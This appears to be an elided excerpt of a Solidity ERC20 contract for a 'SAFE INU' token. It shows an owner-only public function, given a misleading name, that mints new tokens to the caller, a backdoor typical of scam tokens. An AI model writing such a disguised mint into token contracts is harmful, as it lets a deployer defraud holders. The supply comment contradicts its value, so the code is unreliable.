...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SafeInu(uint256 amount) public onlyOwner {
 _SafeInu(msg.sender, amount);
    }
    ...
    function _SafeInu(address account, uint256 amount) internal virtual {
...
contract $SafeInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SAFE INU", "SAFEINU") {
     _SafeInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}